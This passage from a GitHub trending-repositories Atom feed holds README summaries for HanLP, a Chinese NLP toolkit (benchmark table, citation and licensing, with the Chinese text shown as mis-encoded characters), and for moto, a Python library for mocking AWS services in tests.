href=&#34;https://github.com/hankcs/HanLP/tree/master/plugins/hanlp_demo/hanlp_demo/zh/train&#34;&gt;demo&lt;/a&gt;‰∫ÜËß£Êõ¥Â§öËÆ≠ÁªÉËÑöÊú¨„ÄÇ&lt;/p&gt; &#xA;&lt;h2&gt;ÊÄßËÉΩ&lt;/h2&gt; &#xA;&lt;table&gt;&#xA; &lt;thead&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;th rowspan=&#34;2&#34;&gt;lang&lt;/th&gt;&#xA;   &lt;th rowspan=&#34;2&#34;&gt;corpora&lt;/th&gt;&#xA;   &lt;th rowspan=&#34;2&#34;&gt;model&lt;/th&gt;&#xA;   &lt;th colspan=&#34;2&#34;&gt;tok&lt;/th&gt;&#xA;   &lt;th colspan=&#34;4&#34;&gt;pos&lt;/th&gt;&#xA;   &lt;th colspan=&#34;3&#34;&gt;ner&lt;/th&gt;&#xA;   &lt;th rowspan=&#34;2&#34;&gt;dep&lt;/th&gt;&#xA;   &lt;th rowspan=&#34;2&#34;&gt;con&lt;/th&gt;&#xA;   &lt;th rowspan=&#34;2&#34;&gt;srl&lt;/th&gt;&#xA;   &lt;th colspan=&#34;4&#34;&gt;sdp&lt;/th&gt;&#xA;   &lt;th rowspan=&#34;2&#34;&gt;lem&lt;/th&gt;&#xA;   &lt;th rowspan=&#34;2&#34;&gt;fea&lt;/th&gt;&#xA;   &lt;th rowspan=&#34;2&#34;&gt;amr&lt;/th&gt;&#xA;  &lt;/tr&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;th&gt;fine&lt;/th&gt;&#xA;   &lt;th&gt;coarse&lt;/th&gt;&#xA;   &lt;th&gt;ctb&lt;/th&gt;&#xA;   &lt;th&gt;pku&lt;/th&gt;&#xA;   &lt;th&gt;863&lt;/th&gt;&#xA;   &lt;th&gt;ud&lt;/th&gt;&#xA;   &lt;th&gt;pku&lt;/th&gt;&#xA;   &lt;th&gt;msra&lt;/th&gt;&#xA;   &lt;th&gt;ontonotes&lt;/th&gt;&#xA;   &lt;th&gt;SemEval16&lt;/th&gt;&#xA;   &lt;th&gt;DM&lt;/th&gt;&#xA;   &lt;th&gt;PAS&lt;/th&gt;&#xA;   &lt;th&gt;PSD&lt;/th&gt;&#xA;  &lt;/tr&gt;&#xA; &lt;/thead&gt;&#xA; &lt;tbody&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td rowspan=&#34;2&#34;&gt;mul&lt;/td&gt;&#xA;   &lt;td rowspan=&#34;2&#34;&gt;UD2.7&lt;br&gt;OntoNotes5&lt;/td&gt;&#xA;   &lt;td&gt;small&lt;/td&gt;&#xA;   &lt;td&gt;98.62&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;93.23&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;74.42&lt;/td&gt;&#xA;   &lt;td&gt;79.10&lt;/td&gt;&#xA;   &lt;td&gt;76.85&lt;/td&gt;&#xA;   &lt;td&gt;70.63&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;91.19&lt;/td&gt;&#xA;   &lt;td&gt;93.67&lt;/td&gt;&#xA;   &lt;td&gt;85.34&lt;/td&gt;&#xA;   &lt;td&gt;87.71&lt;/td&gt;&#xA;   &lt;td&gt;84.51&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;  &lt;/tr&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td&gt;base&lt;/td&gt;&#xA;   &lt;td&gt;98.97&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;90.32&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;80.32&lt;/td&gt;&#xA;   &lt;td&gt;78.74&lt;/td&gt;&#xA;   &lt;td&gt;71.23&lt;/td&gt;&#xA;   &lt;td&gt;73.63&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;92.60&lt;/td&gt;&#xA;   &lt;td&gt;96.04&lt;/td&gt;&#xA;   &lt;td&gt;81.19&lt;/td&gt;&#xA;   &lt;td&gt;85.08&lt;/td&gt;&#xA;   &lt;td&gt;82.13&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;  &lt;/tr&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td rowspan=&#34;5&#34;&gt;zh&lt;/td&gt;&#xA;   &lt;td rowspan=&#34;2&#34;&gt;open&lt;/td&gt;&#xA;   &lt;td&gt;small&lt;/td&gt;&#xA;   &lt;td&gt;97.25&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;96.66&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;95.00&lt;/td&gt;&#xA;   &lt;td&gt;84.57&lt;/td&gt;&#xA;   &lt;td&gt;87.62&lt;/td&gt;&#xA;   &lt;td&gt;73.40&lt;/td&gt;&#xA;   &lt;td&gt;84.57&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;  &lt;/tr&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td&gt;base&lt;/td&gt;&#xA;   &lt;td&gt;97.50&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;97.07&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;96.04&lt;/td&gt;&#xA;   &lt;td&gt;87.11&lt;/td&gt;&#xA;   &lt;td&gt;89.84&lt;/td&gt;&#xA;   &lt;td&gt;77.78&lt;/td&gt;&#xA;   &lt;td&gt;87.11&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;  &lt;/tr&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td rowspan=&#34;3&#34;&gt;close&lt;/td&gt;&#xA;   &lt;td&gt;small&lt;/td&gt;&#xA;   &lt;td&gt;96.70&lt;/td&gt;&#xA;   &lt;td&gt;95.93&lt;/td&gt;&#xA;   &lt;td&gt;96.87&lt;/td&gt;&#xA;   &lt;td&gt;97.56&lt;/td&gt;&#xA;   &lt;td&gt;95.05&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;96.22&lt;/td&gt;&#xA;   &lt;td&gt;95.74&lt;/td&gt;&#xA;   &lt;td&gt;76.79&lt;/td&gt;&#xA;   &lt;td&gt;84.44&lt;/td&gt;&#xA;   &lt;td&gt;88.13&lt;/td&gt;&#xA;   &lt;td&gt;75.81&lt;/td&gt;&#xA;   &lt;td&gt;74.28&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;  &lt;/tr&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td&gt;base&lt;/td&gt;&#xA;   &lt;td&gt;97.52&lt;/td&gt;&#xA;   &lt;td&gt;96.44&lt;/td&gt;&#xA;   &lt;td&gt;96.99&lt;/td&gt;&#xA;   &lt;td&gt;97.59&lt;/td&gt;&#xA;   &lt;td&gt;95.29&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;96.48&lt;/td&gt;&#xA;   &lt;td&gt;95.72&lt;/td&gt;&#xA;   &lt;td&gt;77.77&lt;/td&gt;&#xA;   &lt;td&gt;85.29&lt;/td&gt;&#xA;   &lt;td&gt;88.57&lt;/td&gt;&#xA;   &lt;td&gt;76.52&lt;/td&gt;&#xA;   &lt;td&gt;73.76&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;  &lt;/tr&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td&gt;ernie&lt;/td&gt;&#xA;   &lt;td&gt;96.95&lt;/td&gt;&#xA;   &lt;td&gt;97.29&lt;/td&gt;&#xA;   &lt;td&gt;96.76&lt;/td&gt;&#xA;   &lt;td&gt;97.64&lt;/td&gt;&#xA;   &lt;td&gt;95.22&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;97.31&lt;/td&gt;&#xA;   &lt;td&gt;96.47&lt;/td&gt;&#xA;   &lt;td&gt;77.95&lt;/td&gt;&#xA;   &lt;td&gt;85.67&lt;/td&gt;&#xA;   &lt;td&gt;89.17&lt;/td&gt;&#xA;   &lt;td&gt;78.51&lt;/td&gt;&#xA;   &lt;td&gt;74.10&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;   &lt;td&gt;-&lt;/td&gt;&#xA;  &lt;/tr&gt;&#xA; &lt;/tbody&gt;&#xA;&lt;/table&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Ê†πÊçÆÊàë‰ª¨ÁöÑ&lt;a href=&#34;https://aclanthology.org/2021.emnlp-main.451&#34;&gt;ÊúÄÊñ∞Á†îÁ©∂&lt;/a&gt;ÔºåÂçï‰ªªÂä°Â≠¶‰π†ÁöÑÊÄßËÉΩÂæÄÂæÄ‰ºò‰∫éÂ§ö‰ªªÂä°Â≠¶‰π†„ÄÇÂú®‰πéÁ≤æÂ∫¶Áîö‰∫éÈÄüÂ∫¶ÁöÑËØùÔºåÂª∫ËÆÆ‰ΩøÁî®&lt;a href=&#34;https://hanlp.hankcs.com/docs/api/hanlp/pretrained/index.html&#34;&gt;Âçï‰ªªÂä°Ê®°Âûã&lt;/a&gt;„ÄÇ&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;HanLPÈááÁî®ÁöÑÊï∞ÊçÆÈ¢ÑÂ§ÑÁêÜ‰∏éÊãÜÂàÜÊØî‰æã‰∏éÊµÅË°åÊñπÊ≥ïÊú™ÂøÖÁõ∏ÂêåÔºåÊØîÂ¶ÇHanLPÈááÁî®‰∫Ü&lt;a href=&#34;https://bbs.hankcs.com/t/topic/3033&#34;&gt;ÂÆåÊï¥ÁâàÁöÑMSRAÂëΩÂêçÂÆû‰ΩìËØÜÂà´ËØ≠Êñô&lt;/a&gt;ÔºåËÄåÈùûÂ§ß‰ºó‰ΩøÁî®ÁöÑÈòâÂâ≤ÁâàÔºõHanLP‰ΩøÁî®‰∫ÜËØ≠Ê≥ïË¶ÜÁõñÊõ¥ÂπøÁöÑ&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/dep/sd_zh.html&#34;&gt;Stanford DependenciesÊ†áÂáÜ&lt;/a&gt;ÔºåËÄåÈùûÂ≠¶ÊúØÁïåÊ≤øÁî®ÁöÑZhang and Clark (2008)Ê†áÂáÜÔºõHanLPÊèêÂá∫‰∫Ü&lt;a href=&#34;https://bbs.hankcs.com/t/topic/3024&#34;&gt;ÂùáÂåÄÂàÜÂâ≤CTBÁöÑÊñπÊ≥ï&lt;/a&gt;ÔºåËÄå‰∏çÈááÁî®Â≠¶ÊúØÁïå‰∏çÂùáÂåÄ‰∏îÈÅóÊºè‰∫Ü51‰∏™ÈªÑÈáëÊñá‰ª∂ÁöÑÊñπÊ≥ï„ÄÇHanLPÂºÄÊ∫ê‰∫Ü&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/master/plugins/hanlp_demo/hanlp_demo/zh/train/open_small.py&#34;&gt;‰∏ÄÊï¥Â•óËØ≠ÊñôÈ¢ÑÂ§ÑÁêÜËÑöÊú¨‰∏éÁõ∏Â∫îËØ≠ÊñôÂ∫ì&lt;/a&gt;ÔºåÂäõÂõæÊé®Âä®‰∏≠ÊñáNLPÁöÑÈÄèÊòéÂåñ„ÄÇ&lt;/p&gt; &#xA;&lt;p&gt;ÊÄª‰πãÔºåHanLPÂè™ÂÅöÊàë‰ª¨ËÆ§‰∏∫Ê≠£Á°Æ„ÄÅÂÖàËøõÁöÑ‰∫ãÊÉÖÔºåËÄå‰∏ç‰∏ÄÂÆöÊòØÊµÅË°å„ÄÅÊùÉÂ®ÅÁöÑ‰∫ãÊÉÖ„ÄÇ&lt;/p&gt; &#xA;&lt;h2&gt;ÂºïÁî®&lt;/h2&gt; &#xA;&lt;p&gt;Â¶ÇÊûú‰Ω†Âú®Á†îÁ©∂‰∏≠‰ΩøÁî®‰∫ÜHanLPÔºåËØ∑ÊåâÂ¶Ç‰∏ãÊ†ºÂºèÂºïÁî®Ôºö&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bibtex&#34;&gt;@inproceedings{he-choi-2021-stem,&#xA;    title = &#34;The Stem Cell Hypothesis: Dilemma behind Multi-Task Learning with Transformer Encoders&#34;,&#xA;    author = &#34;He, Han and Choi, Jinho D.&#34;,&#xA;    booktitle = &#34;Proceedings of the 2021 Conference on Empirical Methods in Natural Language Processing&#34;,&#xA;    month = nov,&#xA;    year = &#34;2021&#34;,&#xA;    address = &#34;Online and Punta Cana, Dominican Republic&#34;,&#xA;    publisher = &#34;Association for Computational Linguistics&#34;,&#xA;    url = &#34;https://aclanthology.org/2021.emnlp-main.451&#34;,&#xA;    pages = &#34;5555--5577&#34;,&#xA;    abstract = &#34;Multi-task learning with transformer encoders (MTL) has emerged as a powerful technique to improve performance on closely-related tasks for both accuracy and efficiency while a question still remains whether or not it would perform as well on tasks that are distinct in nature. We first present MTL results on five NLP tasks, POS, NER, DEP, CON, and SRL, and depict its deficiency over single-task learning. We then conduct an extensive pruning analysis to show that a certain set of attention heads get claimed by most tasks during MTL, who interfere with one another to fine-tune those heads for their own objectives. Based on this finding, we propose the Stem Cell Hypothesis to reveal the existence of attention heads naturally talented for many tasks that cannot be jointly trained to create adequate embeddings for all of those tasks. Finally, we design novel parameter-free probes to justify our hypothesis and demonstrate how attention heads are transformed across the five tasks during MTL through label analysis.&#34;,&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;h3&gt;Ê∫ê‰ª£Á†Å&lt;/h3&gt; &#xA;&lt;p&gt;HanLPÊ∫ê‰ª£Á†ÅÁöÑÊéàÊùÉÂçèËÆÆ‰∏∫ &lt;strong&gt;Apache License 2.0&lt;/strong&gt;ÔºåÂèØÂÖçË¥πÁî®ÂÅöÂïÜ‰∏öÁî®ÈÄî„ÄÇËØ∑Âú®‰∫ßÂìÅËØ¥Êòé‰∏≠ÈôÑÂä†HanLPÁöÑÈìæÊé•ÂíåÊéàÊùÉÂçèËÆÆ„ÄÇHanLPÂèóÁâàÊùÉÊ≥ï‰øùÊä§Ôºå‰æµÊùÉÂøÖÁ©∂„ÄÇ&lt;/p&gt; &#xA;&lt;h5&gt;Ëá™ÁÑ∂ËØ≠‰πâÔºàÈùíÂ≤õÔºâÁßëÊäÄÊúâÈôêÂÖ¨Âè∏&lt;/h5&gt; &#xA;&lt;p&gt;HanLP‰ªév1.7ÁâàËµ∑Áã¨Á´ãËøê‰ΩúÔºåÁî±Ëá™ÁÑ∂ËØ≠‰πâÔºàÈùíÂ≤õÔºâÁßëÊäÄÊúâÈôêÂÖ¨Âè∏‰Ωú‰∏∫È°πÁõÆ‰∏ª‰ΩìÔºå‰∏ªÂØºÂêéÁª≠ÁâàÊú¨ÁöÑÂºÄÂèëÔºåÂπ∂Êã•ÊúâÂêéÁª≠ÁâàÊú¨ÁöÑÁâàÊùÉ„ÄÇ&lt;/p&gt; &#xA;&lt;h5&gt;Â§ßÂø´ÊêúÁ¥¢&lt;/h5&gt; &#xA;&lt;p&gt;HanLP v1.3~v1.65ÁâàÁî±Â§ßÂø´ÊêúÁ¥¢‰∏ªÂØºÂºÄÂèëÔºåÁªßÁª≠ÂÆåÂÖ®ÂºÄÊ∫êÔºåÂ§ßÂø´ÊêúÁ¥¢Êã•ÊúâÁõ∏ÂÖ≥ÁâàÊùÉ„ÄÇ&lt;/p&gt; &#xA;&lt;h5&gt;‰∏äÊµ∑ÊûóÂéüÂÖ¨Âè∏&lt;/h5&gt; &#xA;&lt;p&gt;HanLP Êó©ÊúüÂæóÂà∞‰∫Ü‰∏äÊµ∑ÊûóÂéüÂÖ¨Âè∏ÁöÑÂ§ßÂäõÊîØÊåÅÔºåÂπ∂Êã•Êúâ1.28ÂèäÂâçÂ∫èÁâàÊú¨ÁöÑÁâàÊùÉÔºåÁõ∏ÂÖ≥ÁâàÊú¨‰πüÊõæÂú®‰∏äÊµ∑ÊûóÂéüÂÖ¨Âè∏ÁΩëÁ´ôÂèëÂ∏É„ÄÇ&lt;/p&gt; &#xA;&lt;h3&gt;È¢ÑËÆ≠ÁªÉÊ®°Âûã&lt;/h3&gt; &#xA;&lt;p&gt;Êú∫Âô®Â≠¶‰π†Ê®°ÂûãÁöÑÊéàÊùÉÂú®Ê≥ïÂæã‰∏äÊ≤°ÊúâÂÆöËÆ∫Ôºå‰ΩÜÊú¨ÁùÄÂ∞äÈáçÂºÄÊ∫êËØ≠ÊñôÂ∫ìÂéüÂßãÊéàÊùÉÁöÑÁ≤æÁ•ûÔºåÂ¶Ç‰∏çÁâπÂà´ËØ¥ÊòéÔºåHanLPÁöÑÂ§öËØ≠ÁßçÊ®°ÂûãÊéàÊùÉÊ≤øÁî®&lt;a href=&#34;https://creativecommons.org/licenses/by-nc-sa/4.0/&#34;&gt;CC BY-NC-SA 4.0&lt;/a&gt;Ôºå‰∏≠ÊñáÊ®°ÂûãÊéàÊùÉ‰∏∫‰ªÖ‰æõÁ†îÁ©∂‰∏éÊïôÂ≠¶‰ΩøÁî®„ÄÇ&lt;/p&gt; &#xA;&lt;h2&gt;References&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://hanlp.hankcs.com/docs/references.html&#34;&gt;https://hanlp.hankcs.com/docs/references.html&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>spulec/moto</title>
    <updated>2022-06-08T01:33:25Z</updated>
    <id>tag:github.com,2022-06-08:/spulec/moto</id>
    <link href="https://github.com/spulec/moto" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A library that allows you to easily mock out tests based on AWS infrastructure.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Moto - Mock AWS Services&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://gitter.im/awsmoto/Lobby?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge&#34;&gt;&lt;img src=&#34;https://badges.gitter.im/awsmoto/Lobby.svg?sanitize=true&#34; alt=&#34;Join the chat at https://gitter.im/awsmoto/Lobby&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/spulec/moto/actions&#34;&gt;&lt;img src=&#34;https://github.com/spulec/moto/workflows/TestNDeploy/badge.svg?sanitize=true&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codecov.io/gh/spulec/moto&#34;&gt;&lt;img src=&#34;https://codecov.io/gh/spulec/moto/branch/master/graph/badge.svg?sanitize=true&#34; alt=&#34;Coverage Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;http://docs.getmoto.org&#34;&gt;&lt;img src=&#34;https://readthedocs.org/projects/pip/badge/?version=stable&#34; alt=&#34;Docs&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/moto/&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/v/moto.svg?sanitize=true&#34; alt=&#34;PyPI&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/spulec/moto/master/#&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/pyversions/moto.svg?sanitize=true&#34; alt=&#34;PyPI - Python Version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypistats.org/packages/moto&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/dw/moto.svg?sanitize=true&#34; alt=&#34;PyPI - Downloads&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/psf/black&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/code%20style-black-000000.svg?sanitize=true&#34; alt=&#34;Code style: black&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Install&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ pip install &#39;moto[ec2,s3,all]&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;In a nutshell&lt;/h2&gt; &#xA;&lt;p&gt;Moto is a library that allows your tests to easily mock out AWS Services.&lt;/p&gt; &#xA;&lt;p&gt;Imagine you have the following python code that you want to test:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import boto3&#xA;&#xA;class MyModel(object):&#xA;    def __init__(self, name, value):&#xA;        self.name = name&#xA;        self.value = value&#xA;&#xA;    def save(self):&#xA;        s3 = boto3.client(&#39;s3&#39;, region_name=&#39;us-east-1&#39;)&#xA;        s3.put_object(Bucket=&#39;mybucket&#39;, Key=self.name, Body=self.value)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Take a minute to think how you would have tested that in the past.&lt;/p&gt; &#xA;&lt;p&gt;Now see how you could test it with Moto:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import boto3&#xA;from moto import mock_s3&#xA;from mymodule import MyModel&#xA;&#xA;@mock_s3&#xA;def test_my_model_save():&#xA;    conn = boto3.resource(&#39;s3&#39;, region_name=&#39;us-east-1&#39;)&#xA;    # We need to create the bucket since this is all in Moto&#39;s &#39;virtual&#39; AWS account&#xA;    conn.create_bucket(Bucket=&#39;mybucket&#39;)&#xA;    model_instance = MyModel(&#39;steve&#39;, &#39;is awesome&#39;)&#xA;    model_instance.save()&#xA;    body = conn.Object(&#39;mybucket&#39;, &#39;steve&#39;).get()[&#39;Body&#39;].read().decode(&#34;utf-8&#34;)&#xA;    assert body == &#39;is awesome&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;With the decorator wrapping the test, all the calls to s3 are automatically mocked out. The mock keeps the state of the buckets and keys.&lt;/p&gt; &#xA;&lt;p&gt;For a full list of which services and features are covered, please see our &lt;a href=&#34;https://github.com/spulec/moto/raw/master/IMPLEMENTATION_COVERAGE.md&#34;&gt;implementation coverage&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Documentation&lt;/h3&gt; &#xA;&lt;p&gt;The full documentation can be found here:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://docs.getmoto.org/en/latest/&#34;&gt;http://docs.getmoto.org/en/latest/&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
</feed>